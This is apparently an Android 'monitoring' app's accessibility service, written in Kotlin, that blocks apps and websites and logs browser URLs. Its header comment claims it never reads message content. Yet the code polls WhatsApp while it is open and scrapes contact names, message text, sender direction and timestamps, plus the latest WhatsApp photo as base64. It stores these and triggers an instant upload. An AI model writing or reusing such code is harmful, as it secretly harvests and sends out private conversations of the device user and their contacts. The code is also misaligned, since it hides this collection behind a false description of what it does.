package com.spapp.monitoring.blocking

import android.accessibilityservice.AccessibilityService
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.spapp.monitoring.collectors.FileManagerCollector
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WebHistoryEntry
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

/**
 * Enforces app_blocking rules (Phase 7) and, when web_history_tracking is
 * on, records the URLs it sees in a supported browser's address bar (Phase
 * 10 — see WebHistoryEntry). Only inspects two things, per the project's
 * transparency principles: (1) which app's window just came to the
 * foreground — the same information Android's own Digital Wellbeing/Family
 * Link use — and (2) the visible address-bar text of supported browsers.
 * It never reads message content, chat text, or any other on-screen
 * content. Both bullets are already listed in the on-device consent text
 * ("Website browsing history", "Device lock and file listing on request").
 *
 * WHY ACCESSIBILITY, NOT A CONTENT PROVIDER QUERY: modern Chrome exposes no
 * history API to third-party apps at all (removed from the public SDK years
 * ago) — there is no supported way to read it without this. Address-bar
 * inspection only works for browsers that expose a stable accessibility
 * resource-id for their URL bar, listed below; an unsupported or updated
 * browser simply won't be covered, for blocking or for history, while
 * app-level blocking (blocking a browser entirely) still works regardless.
 *
 * EVENT SUBSCRIPTION — ONLY typeWindowStateChanged (see
 * accessibility_service_config.xml), deliberately. An earlier version also
 * subscribed to typeWindowContentChanged to catch in-page navigation within
 * a browser (switching sites without leaving the window never fires
 * typeWindowStateChanged). That event type fires constantly for every app's
 * every UI redraw system-wide — there is no way to scope it to "only
 * browsers" at the OS subscription level without also scoping
 * typeWindowStateChanged the same way (AccessibilityServiceInfo.packageNames
 * applies to all subscribed event types together, not per type), which would
 * risk silently losing the very event app-blocking depends on for every
 * other app. The flood of extra events was the suspected cause of app
 * blocking becoming intermittent (worked twice, then silently didn't) after
 * that change. Reverted — in-page navigation is now covered by a short
 * polling loop (see browserPollRunnable) that only runs while a browser is
 * confirmed foreground, so it costs nothing for any other app and never
 * touches the service's OS-level event subscription.
 */
class BlockAccessibilityService : AccessibilityService() {

    companion object {
        @Volatile
        var instance: BlockAccessibilityService? = null
            private set
    }

    private lateinit var rulesCache: BlockRulesCache
    private var lastBlockedPackage: String? = null
    private var lastBlockedAt = 0L
    private var lastRecordedUrl: String? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val pollHandler = Handler(Looper.getMainLooper())
    private var browserPollRunnable: Runnable? = null
    private val browserPollIntervalMs = 1500L

    private val browserUrlBarIds = setOf(
        "com.android.chrome:id/url_bar",
        "com.google.android.apps.chrome:id/url_bar",
        "com.brave.browser:id/url_bar",
        "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
        "com.microsoft.emmx:id/url_bar",
    )
    private val browserPackages = browserUrlBarIds.map { it.substringBefore(":id/") }.toSet()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        rulesCache = BlockRulesCache(applicationContext)
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val packageName = event.packageName?.toString() ?: return
        if (packageName == applicationContext.packageName) return // never block ourselves

        if (packageName in browserPackages) {
            recordUrlIfEnabled(event, rootInActiveWindow)
            checkWebsiteRules()
            startBrowserPolling()
        } else {
            stopBrowserPolling()
        }

        if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
            startWhatsAppPolling()
        } else {
            stopWhatsAppPolling()
        }

        checkAppRule(packageName)
    }

    /**
     * Periodically inspects WhatsApp's active conversation window while WhatsApp is foreground.
     */
    private var whatsAppPollRunnable: Runnable? = null
    private val whatsAppPollIntervalMs = 2000L
    private val capturedWhatsAppMsgHashes = mutableSetOf<String>()

    private fun startWhatsAppPolling() {
        if (whatsAppPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                recordWhatsAppChatIfForeground(rootInActiveWindow)
                pollHandler.postDelayed(this, whatsAppPollIntervalMs)
            }
        }
        whatsAppPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopWhatsAppPolling() {
        whatsAppPollRunnable?.let { pollHandler.removeCallbacks(it) }
        whatsAppPollRunnable = null
    }

    private fun recordWhatsAppChatIfForeground(root: AccessibilityNodeInfo?) {
        if (root == null) return
        try {
            val entriesToInsert = mutableListOf<WhatsAppMessageEntry>()
            val now = System.currentTimeMillis()

            fun collectTexts(node: AccessibilityNodeInfo?): List<String> {
                if (node == null) return emptyList()
                val list = mutableListOf<String>()
                fun walk(n: AccessibilityNodeInfo?) {
                    if (n == null) return
                    val t = n.text?.toString()?.trim()
                    if (!t.isNullOrBlank()) {
                        list.add(t)
                    }
                    for (i in 0 until n.childCount) {
                        walk(n.getChild(i))
                    }
                }
                walk(node)
                return list
            }

            fun isTimeOrDate(s: String): Boolean {
                val trimmed = s.trim()
                return trimmed.matches(Regex("^[0-9]{1,2}:[0-9]{2}(\\s*[AaPpMm]{2})?$")) ||
                       trimmed.equals("yesterday", ignoreCase = true) ||
                       trimmed.matches(Regex("^[0-9]{1,2}[/.-][0-9]{1,2}([/.-][0-9]{2,4})?$")) ||
                       trimmed in setOf("Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday")
            }

            fun isSystemLabel(s: String): Boolean {
                val trimmed = s.trim().lowercase()
                return trimmed in setOf("whatsapp", "whatsapp business", "chats", "updates", "calls", "communities", "settings", "search", "archived", "unread", "groups", "all", "type a message", "message", "status", "delivered", "read")
            }

            fun isBadge(s: String): Boolean {
                val trimmed = s.trim()
                return trimmed.matches(Regex("^[0-9]+$")) && (trimmed.toIntOrNull() ?: 0) in 1..999
            }

            val displayMetrics = resources.displayMetrics
            val screenWidth = displayMetrics.widthPixels

            // 1. Check for WhatsApp Chats list rows across standard and business IDs
            val rowIdCandidates = listOf(
                "com.whatsapp:id/conversations_row_contact_name",
                "com.whatsapp.w4b:id/conversations_row_contact_name",
                "com.whatsapp:id/conversations_contact_name",
                "com.whatsapp.w4b:id/conversations_contact_name",
                "com.whatsapp:id/contact_name",
                "com.whatsapp.w4b:id/contact_name",
                "com.whatsapp:id/chat_title",
                "com.whatsapp.w4b:id/chat_title"
            )
            var rowContactNodes: List<AccessibilityNodeInfo>? = null
            for (id in rowIdCandidates) {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                if (!nodes.isNullOrEmpty()) {
                    rowContactNodes = nodes
                    break
                }
            }

            val msgIdCandidates = listOf(
                "com.whatsapp:id/single_msg_tv",
                "com.whatsapp.w4b:id/single_msg_tv",
                "com.whatsapp:id/msg_tv",
                "com.whatsapp.w4b:id/msg_tv",
                "com.whatsapp:id/last_message",
                "com.whatsapp.w4b:id/last_message"
            )
            var rowMsgNodes: List<AccessibilityNodeInfo>? = null
            for (id in msgIdCandidates) {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                if (!nodes.isNullOrEmpty()) {
                    rowMsgNodes = nodes
                    break
                }
            }

            if (!rowContactNodes.isNullOrEmpty()) {
                for (i in rowContactNodes.indices) {
                    val name = rowContactNodes[i].text?.toString()?.trim() ?: continue
                    if (name.isBlank() || isSystemLabel(name)) continue
                    val preview = if (rowMsgNodes != null && i < rowMsgNodes.size) {
                        rowMsgNodes[i].text?.toString()?.trim()
                    } else null

                    val dedupeKey = "ROW|$name|$preview"
                    if (!capturedWhatsAppMsgHashes.contains(dedupeKey)) {
                        capturedWhatsAppMsgHashes.add(dedupeKey)
                        if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()
                        entriesToInsert += WhatsAppMessageEntry(
                            chatName = name,
                            sender = name,
                            messageText = preview ?: "Recent conversation",
                            isOutgoing = false,
                            messageTimeEpochMs = now
                        )
                    }
                }
            } else {
                // Fallback: traverse node tree to find conversation rows when view IDs are obfuscated
                val candidateRows = mutableListOf<AccessibilityNodeInfo>()
                fun findChatRows(node: AccessibilityNodeInfo?) {
                    if (node == null) return
                    val count = node.childCount
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    val w = rect.width()
                    val h = rect.height()
                    if ((node.isClickable || count in 1..10) && w > (screenWidth * 0.5) && h in 70..420) {
                        val texts = collectTexts(node)
                        if (texts.size >= 2 && texts.any { !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) }) {
                            candidateRows.add(node)
                        }
                    }
                    for (i in 0 until count) {
                        findChatRows(node.getChild(i))
                    }
                }
                findChatRows(root)

                for (row in candidateRows) {
                    val texts = collectTexts(row)
                    val candidateTitles = texts.filter {
                        !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) && it.length <= 50
                    }
                    if (candidateTitles.isNotEmpty()) {
                        val title = candidateTitles.first()
                        val snippet = texts.firstOrNull { it != title && !isTimeOrDate(it) && !isBadge(it) && !isSystemLabel(it) }
                        val dedupeKey = "ROW|$title|$snippet"
                        if (!capturedWhatsAppMsgHashes.contains(dedupeKey)) {
                            capturedWhatsAppMsgHashes.add(dedupeKey)
                            if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()
                            entriesToInsert += WhatsAppMessageEntry(
                                chatName = title,
                                sender = title,
                                messageText = snippet ?: "Recent conversation",
                                isOutgoing = false,
                                messageTimeEpochMs = now
                            )
                        }
                    }
                }
            }

            // 2. Check for active open conversation messages
            var chatTitle: String? = null
            val titleIdCandidates = listOf(
                "com.whatsapp:id/conversation_contact_name",
                "com.whatsapp.w4b:id/conversation_contact_name",
                "com.whatsapp:id/action_bar_title",
                "com.whatsapp.w4b:id/action_bar_title",
                "com.whatsapp:id/contact_title",
                "com.whatsapp.w4b:id/contact_title"
            )
            for (id in titleIdCandidates) {
                val nodes = root.findAccessibilityNodeInfosByViewId(id)
                if (!nodes.isNullOrEmpty()) {
                    val candidate = nodes[0].text?.toString()?.trim()
                    if (!candidate.isNullOrBlank() && !isSystemLabel(candidate)) {
                        chatTitle = candidate
                        break
                    }
                }
            }

            // Fallback for chatTitle: find header contact name in top 300px
            if (chatTitle.isNullOrBlank()) {
                val headerNodes = mutableListOf<AccessibilityNodeInfo>()
                fun findHeader(node: AccessibilityNodeInfo?) {
                    if (node == null) return
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.top < 300 && node.text != null && node.text.isNotBlank()) {
                        headerNodes.add(node)
                    }
                    for (i in 0 until node.childCount) {
                        findHeader(node.getChild(i))
                    }
                }
                findHeader(root)
                chatTitle = headerNodes.firstOrNull {
                    val s = it.text.toString().trim()
                    !isSystemLabel(s) && !isTimeOrDate(s) && s != "Navigate up" && !s.contains("online") && !s.contains("last seen") && s.length < 50
                }?.text?.toString()?.trim()
            }

            fun parseBubbleTime(timeStr: String?): Long {
                if (timeStr.isNullOrBlank()) return now
                try {
                    val clean = timeStr.trim().uppercase()
                    val calendar = java.util.Calendar.getInstance()
                    val format = if (clean.contains("AM") || clean.contains("PM")) {
                        java.text.SimpleDateFormat("h:mm a", java.util.Locale.US)
                    } else {
                        java.text.SimpleDateFormat("HH:mm", java.util.Locale.US)
                    }
                    val parsed = format.parse(clean)
                    if (parsed != null) {
                        val parsedCal = java.util.Calendar.getInstance().apply { time = parsed }
                        calendar.set(java.util.Calendar.HOUR_OF_DAY, parsedCal.get(java.util.Calendar.HOUR_OF_DAY))
                        calendar.set(java.util.Calendar.MINUTE, parsedCal.get(java.util.Calendar.MINUTE))
                        calendar.set(java.util.Calendar.SECOND, 0)
                        calendar.set(java.util.Calendar.MILLISECOND, 0)
                        if (calendar.timeInMillis > now + 300_000) {
                            calendar.add(java.util.Calendar.DAY_OF_YEAR, -1)
                        }
                        return calendar.timeInMillis
                    }
                } catch (_: Exception) {}
                return now
            }

            if (!chatTitle.isNullOrBlank()) {
                val msgIdList = listOf(
                    "com.whatsapp:id/message_text",
                    "com.whatsapp.w4b:id/message_text",
                    "com.whatsapp:id/caption",
                    "com.whatsapp.w4b:id/caption"
                )
                var messageNodes: List<AccessibilityNodeInfo>? = null
                for (id in msgIdList) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) {
                        messageNodes = nodes
                        break
                    }
                }

                if (messageNodes.isNullOrEmpty()) {
                    val textList = mutableListOf<AccessibilityNodeInfo>()
                    fun collectMessageTexts(node: AccessibilityNodeInfo?) {
                        if (node == null) return
                        val t = node.text?.toString()?.trim()
                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        if (!t.isNullOrBlank() && !isTimeOrDate(t) && !isSystemLabel(t) && rect.top > 200 && rect.bottom < (displayMetrics.heightPixels - 120)) {
                            if (t != chatTitle && !t.contains("end-to-end encrypted")) {
                                textList.add(node)
                            }
                        }
                        for (i in 0 until node.childCount) {
                            collectMessageTexts(node.getChild(i))
                        }
                    }
                    collectMessageTexts(root)
                    if (textList.isNotEmpty()) {
                        messageNodes = textList
                    }
                }

                if (!messageNodes.isNullOrEmpty()) {
                    for (node in messageNodes) {
                        val text = node.text?.toString()?.trim() ?: continue
                        if (text.isBlank() || isTimeOrDate(text) || isSystemLabel(text)) continue

                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        val isOutgoing = rect.centerX() > (screenWidth / 2)

                        // Associate real bubble timestamp from parent/sibling nodes
                        var bubbleTimeMs = now
                        try {
                            val parent = node.parent
                            if (parent != null) {
                                val siblingTexts = collectTexts(parent)
                                val timeText = siblingTexts.firstOrNull { isTimeOrDate(it) }
                                if (timeText != null) {
                                    bubbleTimeMs = parseBubbleTime(timeText)
                                }
                            }
                        } catch (_: Exception) {}

                        // Check if message is a media photo
                        var mediaType: String? = null
                        var mediaPath: String? = null
                        if (text.contains("📷") || text.contains("Photo", ignoreCase = true) || text.contains("View photo", ignoreCase = true)) {
                            mediaType = "image"
                            try {
                                mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
                            } catch (_: Exception) {}
                        }

                        val dedupeKey = "$chatTitle|$text|$isOutgoing|$bubbleTimeMs"
                        if (capturedWhatsAppMsgHashes.contains(dedupeKey)) continue
                        capturedWhatsAppMsgHashes.add(dedupeKey)
                        if (capturedWhatsAppMsgHashes.size > 2000) {
                            capturedWhatsAppMsgHashes.clear()
                        }

                        entriesToInsert += WhatsAppMessageEntry(
                            chatName = chatTitle,
                            sender = if (isOutgoing) "me" else chatTitle,
                            messageText = text,
                            isOutgoing = isOutgoing,
                            messageTimeEpochMs = bubbleTimeMs,
                            mediaType = mediaType,
                            mediaPath = mediaPath
                        )
                    }
                }
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        db.whatsAppMessageDao().insertAll(entriesToInsert)
                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                    } catch (e: Exception) {
                        Log.e("BlockA11y", "Failed to insert captured WhatsApp messages", e)
                    }
                }
            }
        } catch (_: Exception) {
        }
    }

    /**
     * Re-checks the URL bar every ~1.5s while a browser stays foreground —
     * this is what catches navigating to a different site within the same
     * browser window, which never fires its own TYPE_WINDOW_STATE_CHANGED.
     * Cancelled the moment any other app's window comes to the foreground
     * (stopBrowserPolling, above), so it never runs while the user isn't
     * actually in a browser.
     */
    private fun startBrowserPolling() {
        if (browserPollRunnable != null) return // already running
        val runnable = object : Runnable {
            override fun run() {
                recordUrlIfEnabled(null, rootInActiveWindow)
                checkWebsiteRules()
                pollHandler.postDelayed(this, browserPollIntervalMs)
            }
        }
        browserPollRunnable = runnable
        pollHandler.postDelayed(runnable, browserPollIntervalMs)
    }

    private fun stopBrowserPolling() {
        browserPollRunnable?.let { pollHandler.removeCallbacks(it) }
        browserPollRunnable = null
    }

    private fun loadedRules(): List<BlockRule> {
        if (!::rulesCache.isInitialized) rulesCache = BlockRulesCache(applicationContext)
        return rulesCache.load()
    }

    private fun checkAppRule(packageName: String) {
        val rules = loadedRules()
        if (rules.isEmpty()) return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()

        rules.firstOrNull { it.ruleType == "app" && it.target == packageName }
            ?.let { rule ->
                if (rule.isActiveNow(dayAbbrev, minutesOfDay)) {
                    blockForeground(rule, packageName)
                }
            }
    }

    private fun checkWebsiteRules() {
        val websiteRules = loadedRules().filter { it.ruleType == "website" }
        if (websiteRules.isEmpty()) return

        val urlBarText = findUrlBarText(rootInActiveWindow) ?: return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()
        websiteRules.firstOrNull { rule ->
            rule.isActiveNow(dayAbbrev, minutesOfDay) && urlBarText.contains(rule.target, ignoreCase = true)
        }?.let { rule -> blockForeground(rule, urlBarText) }
    }

    // The omnibox shows one of these as hint text (not a real URL) on an
    // empty/new-tab address bar — without filtering these out, every visit
    // to a blank tab got logged as a fake "visit" to literally this phrase.
    private val addressBarHints = listOf(
        "search google or type url",
        "search google or type web address",
        "search or type url",
        "search or type web address",
    )

    /** `event` is only non-null when called from the window-state-changed path — the title comes from there. */
    private fun recordUrlIfEnabled(event: AccessibilityEvent?, root: AccessibilityNodeInfo?) {
        if (!DeviceState(applicationContext).webHistoryTrackingEnabled) return
        val url = findUrlBarText(root) ?: return
        if (addressBarHints.any { url.trim().equals(it, ignoreCase = true) }) return // omnibox hint text, not a visit
        if (url == lastRecordedUrl) return // debounce — same URL re-fires on scroll/focus events
        lastRecordedUrl = url

        // Chrome reports the page's <title> as the window-state event's own
        // text (this is how the tab/window is announced to accessibility
        // services) — separate from the url_bar node, which only has the URL.
        // Not available on a poll tick (no event), so title stays null then.
        val title = event?.text?.firstOrNull()?.toString()?.takeIf { it.isNotBlank() }

        scope.launch {
            try {
                AppDatabase.getInstance(applicationContext).webHistoryDao().insert(
                    WebHistoryEntry(url = url, title = title, visitedAtEpochMs = System.currentTimeMillis())
                )
            } catch (e: Exception) {
                // Dropped — not worth retrying a single missed URL capture.
            }
        }
    }

    private fun findUrlBarText(root: AccessibilityNodeInfo?): String? {
        if (root == null) return null
        for (resourceId in browserUrlBarIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(resourceId)
            val text = nodes?.firstOrNull()?.text?.toString()
            if (!text.isNullOrBlank()) return text
        }
        return null
    }

    private fun blockForeground(rule: BlockRule, matchedTarget: String) {
        // Debounce — one window-state event can fire multiple times in quick
        // succession; avoid spamming Home actions and duplicate violation reports.
        val now = System.currentTimeMillis()
        if (matchedTarget == lastBlockedPackage && now - lastBlockedAt < 2000) return
        lastBlockedPackage = matchedTarget
        lastBlockedAt = now

        // NOT startActivity(ACTION_MAIN/CATEGORY_HOME) — Android's background
        // activity launch restrictions (tightened further on MIUI) silently
        // swallow a Context.startActivity() call made from a Service with no
        // visible UI of its own, so detection fired (the alert below proves
        // it) but nothing visibly happened. performGlobalAction is the
        // accessibility-specific API for this exact case — it simulates the
        // physical Home button press directly through the accessibility
        // layer, not through the activity-launch path, so it isn't subject
        // to that restriction.
        performGlobalAction(GLOBAL_ACTION_HOME)

        BlockViolationWorker.enqueue(applicationContext, rule.id, matchedTarget)
    }

    private fun currentDayAndMinute(): Pair<String, Int> {
        val cal = Calendar.getInstance()
        val dayAbbrev = SimpleDateFormat("EEE", Locale.US).format(cal.time).lowercase()
        val minutesOfDay = cal.get(Calendar.HOUR_OF_DAY) * 60 + cal.get(Calendar.MINUTE)
        return dayAbbrev to minutesOfDay
    }

    override fun onInterrupt() {
        stopBrowserPolling()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.stop(applicationContext)
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        return super.onUnbind(intent)
    }
}
